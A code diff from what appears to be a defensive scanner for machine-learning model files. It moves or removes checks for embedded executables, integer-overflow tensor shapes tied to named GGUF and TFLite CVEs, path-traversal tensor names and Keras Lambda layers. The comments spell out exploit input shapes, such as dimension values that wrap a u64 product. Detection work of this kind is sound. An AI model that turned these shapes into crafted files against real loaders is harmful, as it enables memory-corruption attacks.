-_GGUF_TYPE_STRING = 8
-_GGUF_TYPE_ARRAY = 9
-_GGUF_FIXED_TYPE_SIZES: dict[int, int] = {
-    0: 1,  # UINT8
-    1: 1,  # INT8
-    2: 2,  # UINT16
-    3: 2,  # INT16
-    4: 4,  # UINT32
-    5: 4,  # INT32
-    6: 4,  # FLOAT32
-    7: 1,  # BOOL
-    10: 8,  # UINT64
-    11: 8,  # INT64
-    12: 8,  # FLOAT64
-}
-
-# ggml type id -> (block_size, type_size), from ggml's public type traits.
-# Needed to replay nbytes arithmetic the way llama.cpp computes it, which is
-# where the integer-overflow CVEs live (CVE-2026-33298's ne = [1024, 1024,
-# 4398046511105, 1] wraps the u64 product). Unknown ids simply skip the
-# bounds replay; an implausibly large id is itself reported.
-_GGML_TYPE_TRAITS: dict[int, tuple[int, int]] = {
-    0: (1, 4),      # F32
-    1: (1, 2),      # F16
-    2: (32, 18),    # Q4_0
-    3: (32, 20),    # Q4_1
-    6: (32, 22),    # Q5_0
-    7: (32, 24),    # Q5_1
-    8: (32, 34),    # Q8_0
-    9: (32, 40),    # Q8_1
-    10: (256, 84),  # Q2_K
-    11: (256, 110),  # Q3_K
-    12: (256, 144),  # Q4_K
-    13: (256, 176),  # Q5_K
-    14: (256, 210),  # Q6_K
-    15: (256, 292),  # Q8_K
-    16: (256, 66),  # IQ2_XXS
-    17: (256, 74),  # IQ2_XS
-    18: (256, 98),  # IQ3_XXS
-    19: (256, 50),  # IQ1_S
-    20: (32, 18),   # IQ4_NL
-    21: (256, 110),  # IQ3_S
-    22: (256, 82),  # IQ2_S
-    23: (256, 136),  # IQ4_XS
-    24: (1, 1),     # I8
-    25: (1, 2),     # I16
-    26: (1, 4),     # I32
-    27: (1, 8),     # I64
-    28: (1, 8),     # F64
-    29: (256, 56),  # IQ1_M
-    30: (1, 2),     # BF16
-    34: (256, 54),  # TQ1_0
-    35: (256, 66),  # TQ2_0
-    39: (256, 82),  # IQ2_M
-}
-
-_GGUF_MAX_DIMS = 4          # GGML_MAX_DIMS
-_GGUF_MAX_PLAUSIBLE_TYPE = 64
-_GGUF_MAX_KEY_BYTES = 1 << 20
-_U64 = 1 << 64
-
-
 # ── Embedded executable detection ────────────────────────────────
 #
 # A model file that *contains* a loadable binary is essentially always
@@ -2009,581 +264,19 @@ _U64 = 1 << 64
 # once per 64K of random data). Each check below is therefore structural:
 # the second stage has to parse, which random tensor bytes do not survive.
 
-_MACHO_MAGICS = (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf",
-                 b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe")
-_MACHO_CPUTYPES = {7, 12, 0x01000007, 0x0100000C}  # x86, arm, x86_64, arm64
-_ELF_MACHINES = {0x03, 0x08, 0x14, 0x15, 0x16, 0x28, 0x2B, 0x3E, 0xB7, 0xF3}
+# Hard budget of candidate magic occurrences validated per format. The hit
+# caps below only stop on *validated* hits; a file of near-miss magics
+# (500MB of "MZMZ...") otherwise iterated once per occurrence -- minutes of
+# pure-Python loop with zero hits to show. Real polyglot payloads carry one
+# or a handful of binaries, so a few thousand validations per format is far
+# beyond anything legitimate; past the budget that format's search stops.
+# Read by _find_embedded_executables (moved to hayward._binary); kept here so
+# the test suite can monkeypatch it on the scanner module. The detector itself
+# is re-exported at the top of this module.
+_EMBEDDED_EXEC_MAX_CANDIDATES = 4096
 
 
-def _find_embedded_executables(data: bytes) -> list[str]:
-    """Structural scan for PE/ELF/Mach-O binaries anywhere in the buffer.
-
-    Returns one description per finding, capped. Runs on model bytes and on
-    archive members alike; every stage is bounded, so worst case on a big
-    file is a handful of candidate validations.
-    """
-    hits: list[str] = []
-
-    pos = data.find(b"MZ")
-    while pos != -1 and len(hits) < 10:
-        # PE: e_lfanew at 0x3C points at a "PE\0\0" signature.
-        if pos + 0x40 <= len(data):
-            (lfanew,) = struct.unpack_from("<I", data, pos + 0x3C)
-            if 0 < lfanew < 1 << 20 and data[pos + lfanew:pos + lfanew + 4] == b"PE\0\0":
-                hits.append(f"PE/Windows executable at offset {pos}")
-        pos = data.find(b"MZ", pos + 1)
-
-    pos = data.find(b"\x7fELF")
-    while pos != -1 and len(hits) < 20:
-        if pos + 20 <= len(data):
-            ident = data[pos + 4:pos + 16]
-            (e_type,) = struct.unpack_from("<H", data, pos + 16)
-            (e_machine,) = struct.unpack_from("<H", data, pos + 18)
-            if (
-                ident[0] in (1, 2)          # EI_CLASS: 32/64-bit
-                and ident[1] in (1, 2)      # EI_DATA: little/big endian
-                and ident[2] == 1           # EI_VERSION
-                and e_type in (2, 3)        # ET_EXEC / ET_DYN
-                and e_machine in _ELF_MACHINES
-            ):
-                hits.append(f"ELF executable at offset {pos}")
-        pos = data.find(b"\x7fELF", pos + 1)
-
-    for magic in _MACHO_MAGICS:
-        pos = data.find(magic)
-        while pos != -1 and len(hits) < 30:
-            if pos + 12 <= len(data):
-                (cputype,) = struct.unpack_from("<I", data, pos + 4)
-                (_cpusubtype, filetype) = struct.unpack_from("<II", data, pos + 8)
-                if magic in (b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"):
-                    # byte-swapped variants read big-endian
-                    (cputype,) = struct.unpack_from(">I", data, pos + 4)
-                    (_cpusubtype, filetype) = struct.unpack_from(">II", data, pos + 8)
-                if cputype in _MACHO_CPUTYPES and 1 <= filetype <= 12:
-                    hits.append(f"Mach-O executable at offset {pos}")
-            pos = data.find(magic, pos + 1)
-
-    return hits
-
-
-
-#
-# ── TFLite layout arithmetic ─────────────────────────────────────
-#
-# TFLite is FlatBuffers: no code executes on load, but the *parser* computes
-# tensor sizes from attacker-chosen dimensions, and CVE-2026-42627 (ArmNN,
-# published 2026-05) is exactly that: TensorShape::GetNumElements()
-# multiplies dimensions in 32-bit without overflow detection, understates
-# the allocation, and BatchToSpaceNd reads past it during Optimize(). The
-# check is the same arithmetic-invariant shape as the GGUF/SafeTensors
-# passes: replay the dimension product in ints that do not wrap and flag
-# anything a 32-bit loader cannot hold.
-#
-# FlatBuffers layout used here (no schema needed):
-#   buffer[0:4]   u32 offset to the root table
-#   buffer[4:8]   "TFL3" file identifier
-#   table:        int32 soffset back to its vtable; vtable is
-#                 u16 vtable_len, u16 table_len, u16 offset per field id
-#   vector:       u32 offset to it, then u32 count, then elements
-# Field ids (TFLite schema, stable since 2017): Model.subgraphs = 2,
-# SubGraph.tensors = 1, Tensor.shape = 1, Tensor.type = 2.
-
-_TFLITE_MAGIC = b"TFL3"
-_TFLITE_MODEL_SUBGRAPHS = 2
-_TFLITE_SUBGRAPH_TENSORS = 1
-_TFLITE_TENSOR_SHAPE = 1
-
-_TFLITE_MAX_DIMS_PRODUCT_32 = 1 << 32
-
-
-def _fb_table_field(data: bytes, table: int, field_id: int) -> int | None:
-    """Absolute offset of a table field's inline value, or None if absent
-    (FlatBuffers omits default-valued fields)."""
-    if table < 4 or table + 4 > len(data):
-        return None
-    (soffset,) = struct.unpack_from("<i", data, table)
-    vtable = table - soffset
-    if vtable < 0 or vtable + 4 > len(data):
-        return None
-    vtable_len, _table_len = struct.unpack_from("<HH", data, vtable)
-    slot = 4 + 2 * field_id
-    if slot + 2 > vtable_len or vtable + slot + 2 > len(data):
-        return None
-    (rel,) = struct.unpack_from("<H", data, vtable + slot)
-    if rel == 0:
-        return None
-    return table + rel
-
-
-def _fb_indirect(data: bytes, at: int | None) -> int | None:
-    """Follow a u32 relative offset to its target's absolute offset."""
-    if at is None or at + 4 > len(data):
-        return None
-    (rel,) = struct.unpack_from("<I", data, at)
-    target = at + rel
-    return target if 0 <= target <= len(data) else None
-
-
-def _fb_int_vector(data: bytes, vec: int | None) -> list[int] | None:
-    """Read a vector of int32 at absolute offset `vec`."""
-    if vec is None or vec + 4 > len(data):
-        return None
-    (count,) = struct.unpack_from("<I", data, vec)
-    if count > 8:  # tensor rank is small; GGML_MAX_DIMS is 4
-        return None
-    if vec + 4 + 4 * count > len(data):
-        return None
-    return list(struct.unpack_from(f"<{count}i", data, vec + 4)) if count else []
-
-
-def _check_tflite_layout(data: bytes) -> list[str]:
-    """Replay every tensor's dimension product in a TFLite model and report
-    shapes a 32-bit loader cannot allocate."""
-    problems: list[str] = []
-    if len(data) < 8:
-        return problems
-    (root_rel,) = struct.unpack_from("<I", data, 0)
-    root = _fb_indirect(data, 0) if root_rel else None
-    if root is None:
-        return ["root table offset points outside the file"]
-    subgraphs_vec = _fb_indirect(data, _fb_table_field(data, root, _TFLITE_MODEL_SUBGRAPHS))
-    if subgraphs_vec is None or subgraphs_vec + 4 > len(data):
-        return problems  # no subgraphs: unusual, but nothing to replay
-    (n_subgraphs,) = struct.unpack_from("<I", data, subgraphs_vec)
-    if n_subgraphs > 4096:
-        problems.append(f"{n_subgraphs} subgraphs (implausible)")
-        return problems
-    for sg in range(n_subgraphs):
-        subgraph = _fb_indirect(data, subgraphs_vec + 4 + 4 * sg)
-        if subgraph is None:
-            continue
-        tensors_vec = _fb_indirect(data, _fb_table_field(data, subgraph, _TFLITE_SUBGRAPH_TENSORS))
-        if tensors_vec is None or tensors_vec + 4 > len(data):
-            continue
-        (n_tensors,) = struct.unpack_from("<I", data, tensors_vec)
-        if n_tensors > (len(data) // 4):
-            problems.append(
-                f"subgraph {sg} claims {n_tensors} tensors in a {len(data)}-byte file"
-            )
-            return problems
-        for t in range(n_tensors):
-            tensor = _fb_indirect(data, tensors_vec + 4 + 4 * t)
-            if tensor is None:
-                continue
-            shape = _fb_int_vector(data, _fb_indirect(
-                data, _fb_table_field(data, tensor, _TFLITE_TENSOR_SHAPE)))
-            if shape is None or not shape:
-                continue
-            if any(d < 0 for d in shape):
-                problems.append(f"tensor {t} of subgraph {sg} has a negative dimension")
-                continue
-            elements = 1
-            for d in shape:
-                elements *= d
-                if elements >= _TFLITE_MAX_DIMS_PRODUCT_32:
-                    problems.append(
-                        f"tensor {t} of subgraph {sg} has {elements} elements: "
-                        f"a 32-bit loader's dimension product wraps "
-                        f"(CVE-2026-42627 shape)"
-                    )
-                    break
-    return problems
-
-
-_SAFETENSORS_DTYPE_SIZES: dict[str, int] = {
-
-    "F64": 8, "F32": 4, "F16": 2, "BF16": 2,
-    "I64": 8, "I32": 4, "I16": 2, "I8": 1,
-    "U64": 8, "U32": 4, "U16": 2, "U8": 1,
-    "BOOL": 1, "F8_E4M3": 1, "F8_E5M2": 1, "F8_E8M0": 1,
-}
-
-# A single tensor larger than 4GB is the integer-overflow shape in C-side
-# loaders; aggregate sizes past the file are the OOB
-# shape (its MFV014). Both are replayed here as arithmetic, not thresholds.
-_SAFETENSORS_MAX_TENSOR_BYTES = 1 << 32
-
-
-def _unsafe_name_reason(name: str) -> str | None:
-    """Why a tensor or member name is not safe to use as a filename.
-
-    Names inside a model container look inert, but plenty of real tooling
-    turns them into paths: shard converters, `save_pretrained` round trips,
-    and anything that materialises tensors individually. A name carrying a
-    traversal segment, an absolute path or a control character is aimed at
-    that behaviour, and it is not something a training run produces by
-    accident. Published bypass proofs of concept ship exactly these five
-    shapes for SafeTensors alone.
-    """
-    if not isinstance(name, str) or not name:
-        return None
-    if "\x00" in name:
-        return "embedded NUL byte"
-    if "\r" in name or "\n" in name:
-        return "embedded newline, which can forge a record boundary"
-    normalised = name.replace("\\", "/")
-    parts = normalised.split("/")
-    if ".." in parts:
-        return "parent-directory traversal segment"
-    if normalised.startswith("/"):
-        return "absolute path"
-    if len(name) > 1 and name[1] == ":" and name[0].isalpha():
-        return "Windows drive-absolute path"
-    return None
-
-
-def _check_safetensors_layout(header: object, data_section_len: int) -> list[str]:
-    """Replay a SafeTensors header's size arithmetic against the file.
-
-    The header is attacker-chosen JSON; loaders allocate and memcpy from it.
-    The spec itself requires offsets to be ordered and non-overlapping, so a
-    file breaking that is malformed by its own contract, and safetensors-rs
-    refuses it -- which is precisely why it must not sail through here.
-    """
-    problems: list[str] = []
-    if not isinstance(header, dict):
-        return problems
-    spans: list[tuple[int, int, str]] = []
-    for name, entry in header.items():
-        reason = _unsafe_name_reason(name)
-        if reason is not None:
-            problems.append(f"tensor name {name!r} carries a {reason}")
-        if name == "__metadata__" or not isinstance(entry, dict):
-            continue
-        offsets = entry.get("data_offsets")
-        if (
-            not isinstance(offsets, list) or len(offsets) != 2
-            or not all(isinstance(o, int) and o >= 0 for o in offsets)
-        ):
-            problems.append(f"tensor {name!r} has malformed data_offsets")
-            continue
-        start, end = offsets
-        if end < start:
-            problems.append(f"tensor {name!r} has end before start in data_offsets")
-            continue
-        span = end - start
-        shape = entry.get("shape")
-        dtype = entry.get("dtype")
-        dtype_size = _SAFETENSORS_DTYPE_SIZES.get(dtype) if isinstance(dtype, str) else None
-        if (
-            dtype_size is not None
-            and isinstance(shape, list)
-            and all(isinstance(d, int) and d >= 0 for d in shape)
-        ):
-            elements = 1
-            for d in shape:
-                elements *= d
-            if elements * dtype_size != span:
-                problems.append(
-                    f"tensor {name!r}: shape x dtype = {elements * dtype_size} bytes "
-                    f"but its span is {span}"
-                )
-        if span > _SAFETENSORS_MAX_TENSOR_BYTES:
-            problems.append(
-                f"tensor {name!r} is {span} bytes (>4GB, integer-overflow shape "
-                f"in C loaders)"
-            )
-        if end > data_section_len:
-            problems.append(
-                f"tensor {name!r} ends at {end}, past the {data_section_len}-byte "
-                f"data section"
-            )
-        spans.append((start, end, name))
-    spans.sort()
-    # spans[1:] is one shorter by construction, so the pairing is
-    # deliberately ragged: strict=False.
-    for (_prev_start, prev_end, prev_name), (start, _end, name) in zip(
-            spans, spans[1:], strict=False):
-        if start < prev_end:
-            problems.append(
-                f"tensors {prev_name!r} and {name!r} overlap in the data section"
-            )
-    return problems
-
-
-def _check_gguf_layout(data: bytes) -> list[str]:
-    """Replay the GGUF container's arithmetic and report every inconsistency.
-
-    llama.cpp allocates and reads based on these counts, lengths, dimensions
-    and offsets, computed in u64. A file whose numbers do not fit the file
-    (or fit only by wrapping u64) is a parser exploit, not a corrupt model:
-    CVE-2025-53630 (count overflow to OOB), CVE-2026-27940 (underallocate,
-    then fread past the buffer) and CVE-2026-33298 (nbytes wraps, defeating
-    size validation) are all this shape. Computed in Python ints, which do
-    not wrap; anything exceeding u64 is reported as the wrap shape.
-    """
-    problems: list[str] = []
-    file_size = len(data)
-    if file_size < 24:
-        return problems  # too small to hold a header; magic check owns this
-    version, tensor_count, kv_count = struct.unpack_from("<IQQ", data, 4)
-    if version not in (1, 2, 3):
-        problems.append(f"GGUF version {version} (spec defines 1-3)")
-    # Every KV entry costs at least 8 (length) + 4 (type) bytes; every tensor
-    # info at least 8 (name length) + 4 (n_dims) + 4 (type) + 8 (offset).
-    # A count the file cannot pay for is a heap-overflow setup.
-    if kv_count * 12 > file_size:
-        problems.append(
-            f"kv_count {kv_count} cannot fit in {file_size} bytes "
-            f"(min 12 bytes/entry)"
-        )
-    if tensor_count * 24 > file_size:
-        problems.append(
-            f"tensor_count {tensor_count} cannot fit in {file_size} bytes "
-            f"(min 24 bytes/info)"
-        )
-
-    offset = 24
-    try:
-        for i in range(min(kv_count, file_size // 12 + 1)):
-            (key_len,) = struct.unpack_from("<Q", data, offset)
-            offset += 8
-            if key_len > _GGUF_MAX_KEY_BYTES:
-                problems.append(f"KV key length {key_len} bytes (buffer-overflow shape)")
-                return problems
-            if offset + key_len + 4 > file_size:
-                problems.append(f"KV entry {i} extends past end of file")
-                return problems
-            offset += key_len
-            (value_type,) = struct.unpack_from("<I", data, offset)
-            offset += 4
-            if value_type == _GGUF_TYPE_STRING:
-                (vlen,) = struct.unpack_from("<Q", data, offset)
-                offset += 8
-                if offset + vlen > file_size:
-                    problems.append(f"KV string value {i} extends past end of file")
-                    return problems
-                offset += vlen
-            elif value_type == _GGUF_TYPE_ARRAY:
-                (elem_type,) = struct.unpack_from("<I", data, offset)
-                (count,) = struct.unpack_from("<Q", data, offset + 4)
-                offset += 12
-                if elem_type == _GGUF_TYPE_STRING:
-                    truncated = False
-                    for _ in range(min(count, file_size // 8 + 1)):
-                        (slen,) = struct.unpack_from("<Q", data, offset)
-                        offset += 8
-                        if offset + slen > file_size:
-                            problems.append(f"KV string array {i} extends past end of file")
-                            truncated = True
-                            break
-                        offset += slen
-                    if truncated:
-                        return problems
-                else:
-                    elem_size = _GGUF_FIXED_TYPE_SIZES.get(elem_type)
-                    if elem_size is None:
-                        problems.append(f"KV array {i} has unknown element type {elem_type}")
-                        return problems
-                    if offset + count * elem_size > file_size:
-                        problems.append(
-                            f"KV array {i} ({count} x {elem_size}B) extends past end of file"
-                        )
-                        return problems
-                    offset += count * elem_size
-            else:
-                size = _GGUF_FIXED_TYPE_SIZES.get(value_type)
-                if size is None:
-                    problems.append(f"KV entry {i} has unknown value type {value_type}")
-                    return problems
-                offset += size
-    except (struct.error, IndexError):
-        problems.append("KV section truncated before kv_count entries")
-        return problems
-
-    try:
-        for i in range(min(tensor_count, file_size // 24 + 1)):
-            (name_len,) = struct.unpack_from("<Q", data, offset)
-            if name_len > _GGUF_MAX_KEY_BYTES:
-                problems.append(f"tensor {i} name length {name_len} bytes")
-                return problems
-            try:
-                tensor_name = data[offset + 8:offset + 8 + name_len].decode(
-                    "utf-8", "replace")
-            except (ValueError, IndexError):
-                tensor_name = ""
-            reason = _unsafe_name_reason(tensor_name)
-            if reason is not None:
-                problems.append(
-                    f"tensor {i} name {tensor_name!r} carries a {reason}")
-            if offset + 8 + name_len + 16 > file_size:
-                problems.append(f"tensor info {i} extends past end of file")
-                return problems
-            offset += 8 + name_len
-            (n_dims,) = struct.unpack_from("<I", data, offset)
-            offset += 4
-            if n_dims < 1 or n_dims > _GGUF_MAX_DIMS:
-                problems.append(f"tensor {i} has {n_dims} dimensions (GGML_MAX_DIMS is 4)")
-                return problems
-            if offset + 8 * n_dims + 12 > file_size:
-                problems.append(f"tensor info {i} extends past end of file")
-                return problems
-            dims = struct.unpack_from(f"<{n_dims}Q", data, offset)
-            offset += 8 * n_dims
-            (type_id,) = struct.unpack_from("<I", data, offset)
-            offset += 4
-            (tensor_offset,) = struct.unpack_from("<Q", data, offset)
-            offset += 8
-            if type_id >= _GGUF_MAX_PLAUSIBLE_TYPE:
-                problems.append(f"tensor {i} has implausible ggml type id {type_id}")
-                continue
-            elements = 1
-            wrapped = False
-            for dim in dims:
-                elements *= dim
-                if elements >= _U64:
-                    problems.append(
-                        f"tensor {i} dimensions wrap u64 (CVE-2026-33298 shape)"
-                    )
-                    wrapped = True
-                    break
-            traits = _GGML_TYPE_TRAITS.get(type_id)
-            if traits is None or wrapped:
-                continue
-            block, type_size = traits
-            nbytes = (dims[0] // block) * type_size if block > 1 else elements * type_size
-            if block > 1:
-                for dim in dims[1:]:
-                    nbytes *= dim
-            if nbytes >= _U64:
-                problems.append(f"tensor {i} byte size wraps u64")
-                continue
-            # Tensor data starts after ALL tensor infos, aligned, so the true
-            # end is at least this large: a file failing even the base-less
-            # check cannot hold the tensor under any alignment.
-            if tensor_offset + nbytes > file_size:
-                problems.append(
-                    f"tensor {i} (offset {tensor_offset} + {nbytes} bytes) "
-                    f"overruns the {file_size}-byte file"
-                )
-    except (struct.error, IndexError):
-        problems.append("tensor info section truncated before tensor_count entries")
-    return problems
-
-
-def _read_gguf_string(data: bytes, offset: int) -> tuple[str, int]:
-    (length,) = struct.unpack_from("<Q", data, offset)
-    offset += 8
-    raw = data[offset:offset + length]
-    return raw.decode("utf-8", errors="replace"), offset + length
-
-
-def _read_gguf_value(data: bytes, offset: int, value_type: int) -> tuple[Any, int]:
-    """Read a GGUF value, returning (value, new_offset).
-
-    Only STRING and ARRAY-of-STRING are materialized (all the security
-    checks below need); every other type is skipped by size and returned as
-    None.
-    """
-    if value_type == _GGUF_TYPE_STRING:
-        return _read_gguf_string(data, offset)
-    if value_type == _GGUF_TYPE_ARRAY:
-        (elem_type,) = struct.unpack_from("<I", data, offset)
-        offset += 4
-        (count,) = struct.unpack_from("<Q", data, offset)
-        offset += 8
-        if elem_type == _GGUF_TYPE_STRING:
-            values: list[str] = []
-            for _ in range(count):
-                s, offset = _read_gguf_string(data, offset)
-                values.append(s)
-            return values, offset
-        elem_size = _GGUF_FIXED_TYPE_SIZES.get(elem_type)
-        if elem_size is None:
-            raise ValueError(f"unknown GGUF array element type {elem_type}")
-        return None, offset + count * elem_size
-    size = _GGUF_FIXED_TYPE_SIZES.get(value_type)
-    if size is None:
-        raise ValueError(f"unknown GGUF value type {value_type}")
-    return None, offset + size
-
-
-def _parse_gguf_metadata(data: bytes, max_offset: int) -> dict[str, Any]:
-    """Parse the GGUF header + metadata KV section into a dict of
-    string/string-array-valued keys. Raises ValueError/struct.error on a
-    malformed or truncated stream -- callers should treat that as
-    "can't verify structurally" rather than a positive signal either way.
-    """
-    if len(data) < 24 or data[:4] != GGUF_MAGIC:
-        raise ValueError("not a GGUF file")
-    _version, _tensor_count, kv_count = struct.unpack_from("<IQQ", data, 4)
-    offset = 4 + 4 + 8 + 8
-    result: dict[str, Any] = {}
-    for _ in range(kv_count):
-        if offset > max_offset:
-            break
-        key, offset = _read_gguf_string(data, offset)
-        # _read_gguf_string advances by an attacker-declared length, so offset
-        # can land far past the file inside a single iteration. unpack_from
-        # raises OverflowError rather than struct.error once it exceeds
-        # ssize_t, which is not in this function's documented failure set and
-        # escaped to the caller as a crash. Re-check the bound here instead.
-        if offset < 0 or offset + 4 > len(data):
-            raise ValueError(f"KV entry runs past the file at offset {offset}")
-        (value_type,) = struct.unpack_from("<I", data, offset)
-        offset += 4
-        value, offset = _read_gguf_value(data, offset, value_type)
-        if value is not None:
-            result[key] = value
-    return result
-
-
-# ── Keras model_config extraction ───────────────────────────────────
-#
-# Keras stores the model architecture as a literal UTF-8 JSON attribute
-# value embedded in the HDF5 file. Rather than a full HDF5 parser (a new
-# dependency), locate the JSON blob directly and parse it -- precise enough
-# to walk the actual layer graph instead of substring-matching the raw
-# binary container (which also contains tensor names and weight bytes that
-# can spuriously contain words like "lambda"/"function").
-
-_KERAS_BUILTIN_LAYER_CLASSES = frozenset({
-    "Sequential", "Functional", "Model",
-    "InputLayer", "Input",
-    "Dense", "Activation", "Dropout", "Flatten", "Reshape", "Permute",
-    "RepeatVector", "Masking", "Embedding",
-    "Conv1D", "Conv2D", "Conv3D", "Conv1DTranspose", "Conv2DTranspose",
-    "Conv3DTranspose", "SeparableConv1D", "SeparableConv2D",
-    "DepthwiseConv2D", "Cropping1D", "Cropping2D", "Cropping3D",
-    "UpSampling1D", "UpSampling2D", "UpSampling3D",
-    "ZeroPadding1D", "ZeroPadding2D", "ZeroPadding3D",
-    "MaxPooling1D", "MaxPooling2D", "MaxPooling3D",
-    "AveragePooling1D", "AveragePooling2D", "AveragePooling3D",
-    "GlobalMaxPooling1D", "GlobalMaxPooling2D", "GlobalMaxPooling3D",
-    "GlobalAveragePooling1D", "GlobalAveragePooling2D", "GlobalAveragePooling3D",
-    "LSTM", "GRU", "SimpleRNN", "Bidirectional", "TimeDistributed",
-    "ConvLSTM1D", "ConvLSTM2D", "ConvLSTM3D",
-    "BatchNormalization", "LayerNormalization", "GroupNormalization",
-    "SpatialDropout1D", "SpatialDropout2D", "SpatialDropout3D",
-    "GaussianNoise", "GaussianDropout", "AlphaDropout",
-    "Add", "Subtract", "Multiply", "Average", "Maximum", "Minimum",
-    "Concatenate", "Dot",
-    "Attention", "AdditiveAttention", "MultiHeadAttention",
-    "LeakyReLU", "PReLU", "ELU", "ReLU", "Softmax", "ThresholdedReLU",
-    "TextVectorization", "Normalization",
-    "Rescaling", "Resizing", "CenterCrop",
-    # Not layers at all, but standard entries in a Keras 3 model_config's
-    # optimizer/loss/metrics/initializer sections, all inert at load:
-    # optimizers.
-    "Adam", "AdamW", "SGD", "RMSprop", "Adagrad", "Adadelta", "Adamax",
-    "Nadam", "Lion", "Lamb", "Ftrl",
-    # Losses and metrics.
-    "BinaryCrossentropy", "CategoricalCrossentropy",
-    "SparseCategoricalCrossentropy", "MeanSquaredError", "MeanAbsoluteError",
-    "MeanAbsolutePercentageError", "Huber", "KLDivergence", "CosineSimilarity",
-    "FocalLoss", "Hinge", "SquaredHinge", "Poisson", "LogCosh",
-    "Accuracy", "BinaryAccuracy", "CategoricalAccuracy",
-    "SparseCategoricalAccuracy", "AUC", "Precision", "Recall", "F1Score",
-    "PrecisionAtRecall", "RecallAtPrecision", "Mean", "Sum", "R2Score",
-    "TopKCategoricalAccuracy", "SparseTopKCategoricalAccuracy",
-    # Initializers and the dtype policy object.
-    "GlorotUniform", "GlorotNormal", "HeNormal", "HeUniform", "LecunNormal",
-    "LecunUniform", "Ones", "Zeros", "RandomNormal", "RandomUniform",
-    "TruncatedNormal", "Orthogonal", "Identity", "Constant", "VarianceScaling",
-    "DTypePolicy",
-    # Keras 3's internal tensor marker in functional graphs.
-    "__keras_tensor__",
-})
+# ── Shared file helper ──────────────────────────────────────────────
 
 
 def _read_file_magic(path: Path, count: int) -> bytes:
@@ -2595,353 +288,10 @@ def _read_file_magic(path: Path, count: int) -> bytes:
         return b""
 
 
-# Streaming search for the Keras architecture blob in a file too large to hold
-# in memory. The window is sized just past _extract_keras_model_config's own
-# 20MB balanced-brace scan limit, so a config it could parse from a full read
-# is equally parseable from the window.
-_KERAS_CONFIG_ANCHOR = b'"class_name"'
-_KERAS_STREAM_CHUNK = 8 * 1024 * 1024
-_KERAS_CONFIG_WINDOW = 24_000_000
-_KERAS_CONFIG_BACKTRACK = 4096
-
-
-def _read_keras_config_window(path: Path) -> bytes | None:
-    """Locate the `model_config` blob in an oversized HDF5 file by streaming.
-
-    Returns a bounded window containing the anchor, positioned far enough back
-    that the caller's `rfind(b"{")` still finds the opening brace, or None when
-    the anchor never appears (a weights-only file has no architecture to check).
-    Peak memory is one chunk plus one window, never the file.
-    """
-    overlap = len(_KERAS_CONFIG_ANCHOR) - 1
-    try:
-        with open(path, "rb") as f:
-            pos = 0          # file offset of buf[0]
-            tail = b""
-            while True:
-                chunk = f.read(_KERAS_STREAM_CHUNK)
-                if not chunk:
-                    return None
-                buf = tail + chunk
-                idx = buf.find(_KERAS_CONFIG_ANCHOR)
-                if idx != -1:
-                    start = max(0, pos + idx - _KERAS_CONFIG_BACKTRACK)
-                    f.seek(start)
-                    return f.read(_KERAS_CONFIG_WINDOW)
-                keep = min(len(buf), overlap)
-                pos += len(buf) - keep
-                tail = buf[len(buf) - keep:] if keep else b""
-    except OSError:
-        return None
-
-
-def _extract_keras_model_config(data: bytes) -> dict | None:
-    """Best-effort extraction of Keras's `model_config` JSON blob from a raw
-    HDF5 byte stream: locate a `"class_name"`-anchored JSON object and parse
-    it with a quote-aware balanced-brace scan. Returns None if no valid JSON
-    model config is found (e.g. a weights-only H5 file with no architecture
-    attribute -- nothing to check).
-    """
-    marker = b'"class_name"'
-    idx = data.find(marker)
-    if idx == -1:
-        return None
-    start = data.rfind(b"{", 0, idx)
-    if start == -1:
-        return None
-
-    depth = 0
-    in_string = False
-    escape = False
-    end = None
-    scan_limit = min(len(data), start + 20_000_000)
-    for i in range(start, scan_limit):
-        byte = data[i:i + 1]
-        if in_string:
-            if escape:
-                escape = False
-            elif byte == b"\\":
-                escape = True
-            elif byte == b'"':
-                in_string = False
-            continue
-        if byte == b'"':
-            in_string = True
-        elif byte == b"{":
-            depth += 1
-        elif byte == b"}":
-            depth -= 1
-            if depth == 0:
-                end = i + 1
-                break
-
-    if end is None:
-        return None
-    try:
-        parsed = json.loads(data[start:end].decode("utf-8"))
-    except (json.JSONDecodeError, UnicodeDecodeError):
-        return None
-    return parsed if isinstance(parsed, dict) else None
-
-
-def _find_keras_risky_layers(config: Any) -> list[str]:
-    """Recursively walk a parsed Keras model_config, returning human-readable
-    descriptions of Lambda layers / unrecognized layer classes actually
-    present in the layer graph -- not a substring match. A Lambda layer's
-    config embeds a marshalled/base64-encoded Python function that executes
-    on load, so its presence alone (regardless of what it does) is the
-    signal; an unrecognized (non-builtin) class name is weaker evidence
-    (most are legitimate custom architectures) and reported separately.
-    """
-    risky: list[str] = []
-
-    def walk(node: Any) -> None:
-        if isinstance(node, dict):
-            class_name = node.get("class_name")
-            if class_name == "Lambda":
-                layer_name = (node.get("config") or {}).get("name", "unnamed")
-                risky.append(f"Lambda layer '{layer_name}'")
-            for value in node.values():
-                walk(value)
-        elif isinstance(node, list):
-            for item in node:
-                walk(item)
-
-    walk(config)
-    # A config can hold the same layer graph more than once -- a SavedModel's
-    # `keras_metadata.pb` stores it under both `config` and `model_config` --
-    # and counting one Lambda layer twice overstates the finding. Layer names
-    # are unique within a Keras model, so collapsing identical descriptions
-    # only ever merges re-serialized copies of one layer, never two real ones.
-    deduped: list[str] = []
-    for item in risky:
-        if item not in deduped:
-            deduped.append(item)
-    return deduped
-
-
-def _find_keras_unrecognized_classes(config: Any) -> list[str]:
-    """Same walk as _find_keras_risky_layers but collects layer class names
-    not on the known-builtin list (excluding Lambda, handled separately) --
-    weaker, informational-only evidence."""
-    unrecognized: set[str] = set()
-
-    def walk(node: Any) -> None:
-        if isinstance(node, dict):
-            class_name = node.get("class_name")
-            if (
-                isinstance(class_name, str)
-                and class_name != "Lambda"
-                and class_name not in _KERAS_BUILTIN_LAYER_CLASSES
-            ):
-                unrecognized.add(class_name)
-            for value in node.values():
-                walk(value)
-        elif isinstance(node, list):
-            for item in node:
-                walk(item)
-
-    walk(config)
-    return sorted(unrecognized)
-
-
-# SafeTensors magic
-SAFETENSORS_MAGIC = b"\x00\x00\x00\x00"
-
 # HDF5's fixed 8-byte file signature (used by both legacy Keras .h5/.hdf5
 # and any other HDF5-backed format) -- shared between _scan_keras and the
 # format-sniffing helper below so the two don't drift on the literal.
 HDF5_SIGNATURE = b"\x89HDF\r\n\x1a\n"
-
-
